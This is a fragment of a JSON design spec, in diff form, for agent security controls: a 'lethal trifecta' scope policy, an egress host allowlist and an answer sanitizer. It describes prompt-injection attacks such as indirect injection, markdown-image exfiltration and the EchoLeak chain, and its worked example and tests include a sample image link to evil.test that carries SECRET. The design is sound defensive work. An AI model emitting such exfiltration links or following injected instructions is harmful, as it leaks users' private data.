+   "dumb": "Each agent gets only the tools and data zones it needs. There is one more rule on top. An agent may hold at most two of three risky powers: seeing private data, reading text from outside, and sending things out. With all three, one planted sentence could make it send private data away. So the policy engine blocks that mix.",
+   "inn": "Agent registration {agent_id, owner, tools[], zones[], requests_private, reads_untrusted, has_outbound} from agent identity (ll_agent). Each tool call {agent_id, tool, args, session_flags} at call time.",
+   "out": "Decision {allow|deny|ask, rule_id, reason} for each call to the policy engine (pl_pol). Scope document {agent_id, tools[], zones[]} to agent identity. Denied-call audit row.",
+   "store": "Policy rule files (Rego or Cedar) in the repo, versioned. Per-agent scope records {agent_id, tools, zones, legs, version}. Session flags in memory for the length of a session.",
+   "fail": "If the policy engine is unreachable, deny every call (fail closed) and page within 1 min. If an agent's legs cannot be computed, treat it as having all three. Rule files are loaded by version; a bad rule file keeps the last good version and pages.",
+   "prop": "Proposal: we cannot reliably detect prompt injection, so we limit what any agent can do when it is injected. This follows Simon Willison's lethal trifecta and OWASP LLM06 Excessive Agency.",
+   "hard": "The legs are declared by the agent owner and tool authors, so a tool that reads untrusted text without saying so is a gap. Tracking taint through a session (CaMeL style) is stronger but costs engineering time and some tasks; CaMeL solved 77% of AgentDojo tasks against 84% undefended (x_sec_camel), so utility cost is real.",
+   "deep": {
+    "purpose": "Give each agent the least scope that works and stop the dangerous combination. The three legs are access to private data, exposure to untrusted content and a way to communicate outward (x_sec_trifecta). An agent may hold two at most in one session. Where a task needs all three, a human approval step or a CaMeL-style split is required: a privileged planner sees only the trusted query and a quarantined reader sees the untrusted text with no tools (x_sec_camel). A new app joins through the connector manifest (so_sdk) or MCP bridge (so_mcp); the manifest declares whether its tools return untrusted text or can send outward, and the guard reads that.",
+    "expected": [
+     "No session holds all three legs; the third is denied or sent for approval",
+     "Every agent has a named owner and a scope no wider than that owner's",
+     "A denial names the rule and the leg that caused it"
+    ],
+    "not_expected": [
+     "It does not detect prompt injection; it limits the damage if one succeeds",
+     "It does not decide document-level access; the permission filter does",
+     "It does not apply to the human user's own browsing of the source app"
+    ],
+    "algorithm": {
+     "name": "Per-agent scope check with trifecta predicate in the policy engine",
+     "formula": "deny if legs(session) = {private, untrusted, outbound}; legs grow monotonically in a session; allow iff tool in scope(agent) and zone in zones(agent)",
+     "steps": [
+      "At registration, record tools and zones the agent may use; reject any scope wider than its owner's",
+      "Tag each tool with the legs it adds: reads_private, returns_untrusted, can_send_outbound (declared in the manifest, checked in review)",
+      "At each call, add the tool's legs to the session's set (never remove them in the same session)",
+      "Evaluate the rule: if the set after this call would contain all 3 legs, deny, or ask a human when the policy says ask",
+      "Check tool in scope and target zone in zones; deny otherwise",
+      "Write the decision and rule id to the audit log"
+     ],
+     "params": {
+      "max_legs": "2 of 3 (x_sec_trifecta)",
+      "approval": "human approval required for a call that would add the third leg (design)",
+      "session_taint": "legs persist until the session ends (design)",
+      "default": "deny when a tool lacks leg tags"
+     }
+    },
+    "math": {
+     "definitions": [
+      "L: set of legs, {P private, U untrusted, O outbound}",
+      "legs(s): legs held by session s",
+      "tool t adds legs(t) subset of L"
+     ],
+     "formula_full": "allow(t, s) iff (legs(s) union legs(t)) != {P, U, O} and t in scope(agent)",
+     "derivation": "The data theft needs all three: P to have something to steal, U to deliver the attack, O to carry the data out. Removing any one leg breaks the attack, so the rule forbids the full set. Because legs only accumulate within a session, an agent cannot drop one leg to add another.",
+     "worked_example": "Session starts empty. Call search (adds P): legs {P}. Call fetch_web_page (adds U): legs {P,U}. Call send_email (adds O): union would be {P,U,O}, so denied or sent for approval. A second agent that only reads private docs and summarises (P only) is allowed without limit.",
+     "complexity": "O(1) per call: a set union over 3 legs plus a scope lookup; under 1 ms in OPA or Cedar.",
+     "failure_modes": [
+      "Tool lacks leg tags: default deny",
+      "Legs reset by opening a new session mid-task: legs are tied to the user task id, not only the session id",
+      "Two agents together hold the three legs via a shared scratch store: cross-agent shared state is itself tagged as P and U"
+     ],
+     "calibration": "Start by tagging every shipped tool. Review denials weekly; if a legitimate workflow is blocked more than 3 times a week, move it to a CaMeL-style split or a human approval, never loosen the predicate."
+    },
+    "alternatives": [
+     {
+      "name": "Prompt-injection classifier in front of the model",
+      "why_rejected": "The trifecta guidance says guardrail products are not a reliable fix (x_sec_trifecta); we use them only as an extra layer."
+     },
+     {
+      "name": "Full CaMeL control and data flow separation",
+      "why_rejected": "Provable security on AgentDojo tasks, but it solved 77% of tasks against 84% undefended (x_sec_camel) and needs a custom interpreter. Kept for high-risk workflows."
+     }
+    ],
+    "security": [
+     "Indirect prompt injection in a retrieved page tells the agent to email private notes (OWASP LLM01 Prompt Injection, p_indirect-injection): the third leg is denied before the send",
+     "Excessive agency: an agent with a broad scope is tricked into a destructive tool (OWASP LLM06): scope is the owner's scope and no wider, high impact calls need approval (x_sec_owasp-llm06)",
+     "Scope escalation by editing the agent's own record: scope records are written only by the registration service, not by any tool"
+    ],
+    "performance": {
+     "slo": "Decision p95 under 3 ms (design)",
+     "complexity": "O(1) per call",
+     "scaling": "Stateless policy evaluation with in-memory session flags. At 10x calls, scale policy-engine replicas; session flags move to a shared cache."
+    },
+    "edge_cases": [
+     "Agent only reads public data: it carries no P leg and may use outbound tools",
+     "Human approves the third leg: approval is logged with the call text and expires after the call",
+     "Tool added later that returns untrusted text but is untagged: default deny until tagged",
+     "A new app's tools arrive via the connector manifest (so_sdk) or MCP bridge (so_mcp): the manifest must declare legs; an MCP tool without tags is treated as having U and O",
+     "Long task that runs for days: legs follow the task id so they do not reset",
+     "Policy file fails to load: last good version stays active"
+    ],
+    "tests": [
+     {
+      "name": "two legs allowed",
+      "given": "session calls search then fetch_web_page",
+      "expect": "both allowed, legs {P,U}"
+     },
+     {
+      "name": "third leg denied",
+      "given": "same session then calls send_email",
+      "expect": "denied with rule trifecta and leg O named"
+     },
+     {
+      "name": "approval path",
+      "given": "same call with human approval present",
+      "expect": "allowed once, approval logged"
+     },
+     {
+      "name": "missing tags",
+      "given": "register a tool with no leg tags",
+      "expect": "default deny until tagged"
+     }
+    ],
+    "cost_levers": [
+     "Policy evaluation is a set union; no model call. Tag tools once at registration instead of inspecting arguments"
+    ],
+    "feedback_events": [
+     "Each denied call is reviewed weekly; repeated legitimate denials become a CaMeL-style workflow or a reviewed approval"
+    ],
+    "analytics_events": [
+     {
+      "name": "scope.decision",
+      "fields": [
+       "agent_id",
+       "tool",
+       "decision",
+       "rule_id",
+       "legs"
+      ],
+      "when": "on each call"
+     },
+     {
+      "name": "scope.trifecta_block",
+      "fields": [
+       "agent_id",
+       "task_id",
+       "leg_added"
+      ],
+      "when": "when the third leg is denied"
+     },
+     {
+      "name": "scope.approval",
+      "fields": [
+       "agent_id",
+       "approver",
+       "tool"
+      ],
+      "when": "when a human approves"
+     }
+    ],
+    "papers": [
+     {
+      "ref": "x_sec_camel",
+      "key_idea": "Separating control flow and data flow with capabilities enforced at tool calls gives provable security against prompt injection.",
+      "how": "Used as the stronger pattern for workflows that need all three legs."
+     },
+     {
+      "ref": "p_indirect-injection",
+      "key_idea": "Instructions hidden in fetched content can hijack an LLM-integrated application.",
+      "how": "Justifies treating every retrieved text as untrusted (U leg)."
+     }
+    ],
+    "repos": [
+     {
+      "ref": "r_opa",
+      "name": "Open Policy Agent",
+      "take": "Rego rules can express the trifecta predicate and per-agent scope as versioned data; Cedar is the alternative."
+     }
+    ],
+    "industry": "Simon Willison names the three legs and says to avoid combining them (x_sec_trifecta). EchoLeak in Microsoft 365 Copilot used one crafted email to pull data out (CVE-2025-32711, t_t52).",
+    "refs": [
+     "x_sec_trifecta",
+     "x_sec_camel",
+     "x_sec_owasp-llm",
+     "x_sec_owasp-llm06",
+     "p_indirect-injection",
+     "t_t52",
+     "r_opa"
+    ]
+   },
+   "req": "not in any research source"
+  },
+  "sc_egress": {
+   "line": "Outbound calls go only to an allowlist of hosts, and rendered links and images are stripped from answers\nno answer text can fetch a URL",
+   "dumb": "An answer can hide a trap: a picture link whose address carries private data, which the reader's screen fetches on its own. So we remove links and images from answers before they leave. We also let our servers call only a short list of approved hosts, so even a tricked agent has nowhere to send data.",
+   "inn": "Answer text from the result envelope (ll_fmt). Outbound call requests {tenant, caller, host, port, path} from the scoped writer (ag_write) and from connectors. Per-tenant allowlist {host, purpose, owner, added_at}.",
+   "out": "Answer text with markdown images removed and links replaced by plain text plus a registered source pointer; allow or deny for each outbound call; denied-egress audit row {tenant, caller, host, reason}.",
+   "store": "Allowlist table {tenant, host, purpose, owner, added_at, expires_at}, edited by a human admin only. Denial log without payloads.",
+   "fail": "If the allowlist cannot be read, deny all outbound calls (fail closed) and page within 1 min. If the stripper throws on an answer, the answer is returned as plain text with all angle brackets and URL schemes removed. Each denial is logged; 20 denials from one caller in 10 min pages security.",
+   "prop": "Proposal: a private-data leak needs a way out. Closing the two ways out we control (our own servers and links in answers) removes the third leg of the lethal trifecta for the brain itself.",
+   "hard": "Plain text URLs that a user copies and clicks cannot be blocked without breaking use; we strip only automatic fetches (images) and rewrite links. Allowed hosts can themselves be abused as proxies, as in EchoLeak (t_t52), so the allowlist is kept short. Anthropic's published outbound range is shared across services and gives no per-org egress (x_sa_ip-range).",
+   "deep": {
+    "purpose": "Close the exits. Exfiltration through markdown images works because the client fetches the image URL on render, carrying data in the address. EchoLeak chained a link-redaction bypass with an allowed proxy to send data out (t_t52). The brain removes images and active content from answers, rewrites links to plain text with a pointer to the source, and lets its own servers reach only a short allowlist of hosts. A new app joins through the connector manifest (so_sdk) or the MCP bridge (so_mcp); the manifest lists the hosts that connector needs and an admin approves them into the allowlist.",
+    "expected": [
+     "No answer reaches a client with an image, iframe, script or auto-fetched URL",
+     "A link in an answer appears as text and a source pointer, not as an active hyperlink to an arbitrary host",
+     "An outbound call to a host not on the allowlist is refused and logged"
+    ],
+    "not_expected": [
+     "It does not stop a user from reading a URL in plain text and typing it",
+     "It does not judge whether answer content is true or private; permission and secret scans do",
+     "It does not control egress of the AI client itself, only the brain's own responses and servers"
+    ],
+    "algorithm": {
+     "name": "Host allowlist with exact match plus answer sanitizer that strips images and rewrites links",
+     "formula": "allow(call) iff host(call) in A_tenant and port in {443} and scheme = https; sanitize(text) = text without image syntax, HTML tags and bare auto-fetch URLs",
+     "steps": [
+      "Parse the answer as markdown; drop image nodes (alt text kept, URL removed)",
+      "Remove raw HTML tags, iframes, scripts, and reference-style image definitions",
+      "Rewrite each link as 'label (source: pointer id)' where the pointer id is one the brain issued, else plain text with the URL defanged",
+      "Apply the same stripping to every structured field that clients may render (title, snippet)",
+      "For outbound calls, normalise the host (lowercase, punycode), resolve DNS, and require both the host and the resolved IP class to be allowed; deny private and link-local ranges",
+      "Log denials and sanitizer removals with counts, never content"
+     ],
+     "params": {
+      "ports": "443 only (design)",
+      "scheme": "https only (design)",
+      "match": "exact host or exact registered suffix; no wildcards by default (design)",
+      "allowlist_review": "every 90 days (design)",
+      "private_ranges": "deny RFC 1918 and link-local to block server-side request forgery (design)"
+     }
+    },
+    "math": {
+     "definitions": [
+      "A_tenant: set of allowed hosts for a tenant",
+      "h(call): normalised host of an outbound call",
+      "R: number of allowed hosts"
+     ],
+     "formula_full": "allowed(call) iff h(call) in A_tenant and scheme(call) = https and port(call) = 443 and resolved_ip(call) not in private_ranges",
+     "derivation": "A set membership test on a normalised host is exact, so a lookalike host fails. Checking the resolved address as well blocks a name that points at an internal service.",
+     "worked_example": "A_tenant = {api.example-crm.com, graph.example-cloud.com}. Call to api.example-crm.com on 443: allowed. Call to api.example-crm.com.evil.test: not in the set, denied. Answer 'Q3 plan ![x](https://evil.test/p?d=SECRET)' becomes 'Q3 plan x' with 1 image removed.",
+     "complexity": "O(1) host lookup in a hash set; sanitizer O(n) in answer length; under 1 ms per 8 KB answer.",
+     "failure_modes": [
+      "Lookalike or unicode host passes a naive check: normalise to punycode and match exactly",
+      "DNS rebinding returns an internal IP after the name check: resolve once and pin the IP for the call",
+      "Link redaction bypass using reference-style markdown (the EchoLeak pattern): parse the full markdown tree, do not use a single regex"
+     ],
+     "calibration": "Start with the hosts of enabled connectors only. Each new host needs an owner and a purpose. Review the denial log every 90 days and remove hosts with no traffic."
+    },
+    "alternatives": [
+     {
+      "name": "Regex that deletes image markdown only",
+      "why_rejected": "Reference-style images and HTML tags bypass a single regex; EchoLeak chained a redaction bypass (t_t52)."
+     },
+     {
+      "name": "Content security policy header on the client",
+      "why_rejected": "The brain does not own every client; a stripped answer is safe in any client, a header only in browsers we control."
+     }
+    ],
+    "security": [
+     "Markdown image exfiltration: an injected instruction makes the model write an image whose URL holds private data; the sanitizer drops every image before the answer leaves (OWASP LLM05 Improper Output Handling)",
+     "Server-side request forgery from a connector or writer to an internal address: private and link-local ranges are denied even for allowed names",
+     "Abuse of an allowed host as a relay (EchoLeak proxy, t_t52): keep the list short, use exact hosts, review every 90 days"
+    ],
+    "performance": {
+     "slo": "Sanitizer p95 under 3 ms per answer; allowlist check under 1 ms plus one DNS lookup, cached 60 s (design)",
+     "complexity": "O(n) text; O(1) host lookup",
+     "scaling": "Stateless; scales horizontally. At 10x answers the sanitizer is CPU-bound and cheap; DNS cache keeps lookup cost flat."
+    },
+    "edge_cases": [
+     "Answer with a legitimate chart image link: removed; the pointer lets the user open the source",
+     "Autolinked bare URL in text: defanged so the client does not auto-fetch it",
+     "Connector for a self-hosted app on a private IP: needs an admin-approved private-range exception per tenant, logged",
+     "Wildcard host request from an admin: refused unless the suffix is registered and reviewed",
+     "A new app (so_sdk manifest or so_mcp bridge) lists its hosts in the manifest and an admin approves them; no code change",
+     "Allowlist entry expires: calls fail closed with a clear error, not a silent skip"
+    ],
+    "tests": [
+     {
+      "name": "image stripped",
+      "given": "answer with an inline markdown image whose URL carries data",
+      "expect": "image removed, alt text kept, 0 image nodes in output"
+     },
+     {
+      "name": "reference image",
+      "given": "answer using reference-style image definition",
+      "expect": "definition removed, no URL remains"
+     },
+     {
+      "name": "lookalike host",
+      "given": "outbound call to allowed-host.com.evil.test",
+      "expect": "denied, row logged"
+     },
+     {
+      "name": "private range",
+      "given": "allowed name resolving to 10.0.0.5",
+      "expect": "denied by private-range rule"
+     }
+    ],
+    "cost_levers": [
+     "No model call; cache DNS answers 60 s; one sanitizer pass for all fields"
+    ],
+    "feedback_events": [
+     "A user report that a needed link was removed adds a source pointer type, never an allowlist wildcard"
+    ],
+    "analytics_events": [
+     {
+      "name": "egress.denied",
+      "fields": [
+       "tenant_id",
+       "caller",
+       "host",
+       "reason"
+      ],
+      "when": "on each denied outbound call"
+     },
+     {
+      "name": "answer.sanitized",
+      "fields": [
+       "tenant_id",
+       "n_images",
+       "n_links",
+       "n_tags"
+      ],
+      "when": "when stripping changes an answer"
+     }
+    ],
+    "papers": [],
+    "repos": [],
+    "industry": "EchoLeak in Microsoft 365 Copilot bypassed link redaction and used an allowed proxy to send data from one email (CVE-2025-32711, t_t52). OWASP lists Improper Output Handling as LLM05 (x_sec_owasp-llm).",
+    "refs": [
+     "t_t52",
+     "x_sec_trifecta",
+     "x_sec_owasp-llm",
+     "x_sa_ip-range",
+     "p_indirect-injection"
+    ]
+   },
+   "req": "not in any research source"
+  }
+ },
+ "edges": [
+  {
+   "a": "sc_split",
+   "b": "sc_runtime",
+   "l": "class key roles",
+   "k": "s",
+   "d": "Which role may decrypt which token class; runtime role is allowed on both under separate audit labels"
+  },
+  {
+   "a": "sc_noconf",
+   "b": "sc_scope",
+   "l": "clean tool list",
+   "k": "s",
+   "d": "Audited tool registry with no credential tool; scope rules are written against this list"
+  },
+  {
+   "a": "sc_scan",
+   "b": "sc_egress",
+   "l": "answer verdict",
+   "k": "n",
+   "d": "Scanned answer text and block verdict; the egress step then strips links and images"
+  },
+  {
+   "a": "sc_scope",
+   "b": "sc_egress",
+   "l": "outbound legs",
+   "k": "s",
+   "d": "Tools tagged can_send_outbound and the hosts their agents may reach"
+  },
+  {
+   "a": "sc_egress",
+   "b": "sc_scan",
+   "l": "sanitized answer",
+   "k": "n",
+   "d": "Answer after link and image removal, rescanned for secrets once more before return"
+  }
+ ]
+}
